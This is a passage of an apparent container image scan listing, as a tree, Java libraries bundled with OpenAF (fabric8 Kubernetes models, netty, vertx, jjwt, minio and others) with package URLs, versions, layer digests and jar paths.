-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-certificates-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [44]  ╭ Name      : io.fabric8:kubernetes-model-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-common@7.6.1 
-                 │       │            ╰ UID : 62c70b9ec22d2053 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-common-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [45]  ╭ Name      : io.fabric8:kubernetes-model-coordination 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-coordination@7.6.1 
-                 │       │            ╰ UID : ca7b596b77bf081c 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-coordination-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [46]  ╭ Name      : io.fabric8:kubernetes-model-core 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-core@7.6.1 
-                 │       │            ╰ UID : b5c91f9a79562117 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-core-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [47]  ╭ Name      : io.fabric8:kubernetes-model-discovery 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-discovery@7.6.1 
-                 │       │            ╰ UID : 20ae8e9fdba15d 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-discovery-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [48]  ╭ Name      : io.fabric8:kubernetes-model-events 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-events@7.6.1 
-                 │       │            ╰ UID : 6726e1338d377c10 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-events-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [49]  ╭ Name      : io.fabric8:kubernetes-model-extensions 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-extensions@7.6.1 
-                 │       │            ╰ UID : d66d82d1529da9f7 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-extensions-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [50]  ╭ Name      : io.fabric8:kubernetes-model-flowcontrol 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-flowcontrol@7.6.1 
-                 │       │            ╰ UID : 245fda9fbe5cf3f2 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-flowcontrol-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [51]  ╭ Name      : io.fabric8:kubernetes-model-gatewayapi 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-gatewayapi@7.6.1 
-                 │       │            ╰ UID : 58f23eb0eaff6a62 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-gatewayapi-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [52]  ╭ Name      : io.fabric8:kubernetes-model-metrics 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-metrics@7.6.1 
-                 │       │            ╰ UID : c2e013a80d8973fa 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-metrics-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [53]  ╭ Name      : io.fabric8:kubernetes-model-networking 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-networking@7.6.1 
-                 │       │            ╰ UID : f01e540bc37ff3b1 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-networking-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [54]  ╭ Name      : io.fabric8:kubernetes-model-node 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-node@7.6.1 
-                 │       │            ╰ UID : a14267b1835c244b 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-node-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [55]  ╭ Name      : io.fabric8:kubernetes-model-policy 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-policy@7.6.1 
-                 │       │            ╰ UID : 7960f2ecf5819f36 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-policy-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [56]  ╭ Name      : io.fabric8:kubernetes-model-rbac 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-rbac@7.6.1 
-                 │       │            ╰ UID : 1205058b35fe8e3e 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-rbac-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [57]  ╭ Name      : io.fabric8:kubernetes-model-resource 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-resource@7.6.1 
-                 │       │            ╰ UID : a68de97f3676b2cf 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-resource-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [58]  ╭ Name      : io.fabric8:kubernetes-model-scheduling 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-scheduling@7.6.1 
-                 │       │            ╰ UID : 51d95e478273d968 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-scheduling-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [59]  ╭ Name      : io.fabric8:kubernetes-model-storageclass 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-storageclass@7.6.1 
-                 │       │            ╰ UID : e5f7f68046af1364 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/kubernetes-model-storageclass-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [60]  ╭ Name      : io.fabric8:zjsonpatch 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/zjsonpatch@7.6.1 
-                 │       │            ╰ UID : a63db4e3ccdccb3e 
-                 │       ├ Version   : 7.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/zjsonpatch-7.6.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [61]  ╭ Name      : io.jsonwebtoken:jjwt-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-api@0.13.0 
-                 │       │            ╰ UID : fe506a80a2899a4a 
-                 │       ├ Version   : 0.13.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [62]  ╭ Name      : io.jsonwebtoken:jjwt-gson 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-gson@0.13.0 
-                 │       │            ╰ UID : cc7c47a353e36bec 
-                 │       ├ Version   : 0.13.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [63]  ╭ Name      : io.jsonwebtoken:jjwt-impl 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-impl@0.13.0 
-                 │       │            ╰ UID : fb75cc968ac3dc0d 
-                 │       ├ Version   : 0.13.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [64]  ╭ Name      : io.minio:minio 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.minio/minio@9.0.0 
-                 │       │            ╰ UID : c3d88819980fb569 
-                 │       ├ Version   : 9.0.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/minio-9.0.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [65]  ╭ Name      : io.netty:netty-buffer 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-buffer@4.2.12.Final 
-                 │       │            ╰ UID : cc0519ac7d6544d3 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-buffer-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [66]  ╭ Name      : io.netty:netty-codec-base 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-base@4.2.12.Final 
-                 │       │            ╰ UID : c913651beadac915 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-base-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [67]  ╭ Name      : io.netty:netty-codec-compression 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
-                 │       │            ╰ UID : d5a032dd793fa143 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [68]  ╭ Name      : io.netty:netty-codec-dns 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
-                 │       │            ╰ UID : d1018bca82fa2aba 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [69]  ╭ Name      : io.netty:netty-codec-http 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                 │       │            ╰ UID : 42139b2b89dda2f4 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [70]  ╭ Name      : io.netty:netty-codec-http2 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
-                 │       │            ╰ UID : c9374114bd085c75 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [71]  ╭ Name      : io.netty:netty-codec-socks 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-socks@4.2.12.Final 
-                 │       │            ╰ UID : 6dac766b028678d7 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-codec-socks-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [72]  ╭ Name      : io.netty:netty-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-common@4.2.12.Final 
-                 │       │            ╰ UID : 8d08b61b7945b6a0 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [73]  ╭ Name      : io.netty:netty-handler 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler@4.2.12.Final 
-                 │       │            ╰ UID : 9402666d1399aa5 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-handler-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [74]  ╭ Name      : io.netty:netty-handler-proxy 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
-                 │       │            ╰ UID : 8344d1e8c7524c10 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [75]  ╭ Name      : io.netty:netty-resolver 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver@4.2.12.Final 
-                 │       │            ╰ UID : d7528834b57654bb 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-resolver-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [76]  ╭ Name      : io.netty:netty-resolver-dns 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver-dns@4.2.12.Final 
-                 │       │            ╰ UID : 3f10c8fba6a3f35a 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-resolver-dns-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [77]  ╭ Name      : io.netty:netty-transport 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport@4.2.12.Final 
-                 │       │            ╰ UID : dc0c50a667b2c4b9 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-transport-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [78]  ╭ Name      : io.netty:netty-transport-native-unix-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport-native-unix-common@4.2.12.Final 
-                 │       │            ╰ UID : cd2b8af680c1bef9 
-                 │       ├ Version   : 4.2.12.Final 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-transport-native-unix-common-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [79]  ╭ Name      : io.sigpipe:jbsdiff 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.sigpipe/jbsdiff@1.0 
-                 │       │            ╰ UID : e618a95843fba36b 
-                 │       ├ Version   : 1.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [80]  ╭ Name      : io.vertx:vertx-auth-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-auth-common@4.5.24 
-                 │       │            ╰ UID : 4953632041865418 
-                 │       ├ Version   : 4.5.24 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/vertx-auth-common-4.5.24.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [81]  ╭ Name      : io.vertx:vertx-core 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
-                 │       │            ╰ UID : afaef31c626f9650 
-                 │       ├ Version   : 4.5.24 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/vertx-core-4.5.24.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [82]  ╭ Name      : io.vertx:vertx-web-client 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-client@4.5.24 
-                 │       │            ╰ UID : df16d1babd29b056 
-                 │       ├ Version   : 4.5.24 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/vertx-web-client-4.5.24.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [83]  ╭ Name      : io.vertx:vertx-web-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-common@4.5.24 
-                 │       │            ╰ UID : 95ad12caeb922cc7 
-                 │       ├ Version   : 4.5.24 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/vertx-web-common-4.5.24.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [84]  ╭ Name      : jakarta.activation:jakarta.activation-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/jakarta.activation/jakarta.activation-api@1.2.2 
-                 │       │            ╰ UID : 5d2ee0e1a121653f 
-                 │       ├ Version   : 1.2.2 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [85]  ╭ Name      : javax.xml.bind:jaxb-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/javax.xml.bind/jaxb-api@2.3.1 
-                 │       │            ╰ UID : d465243f613cf5b8 
-                 │       ├ Version   : 2.3.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [86]  ╭ Name      : jline:jline 
-                 │       ├ Identifier ╭ PURL: pkg:maven/jline/jline@2.14.6 
-                 │       │            ╰ UID : 509c1c4b5bcd42a1 
-                 │       ├ Version   : 2.14.6 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [87]  ╭ Name      : org.apache.commons:commons-collections4 
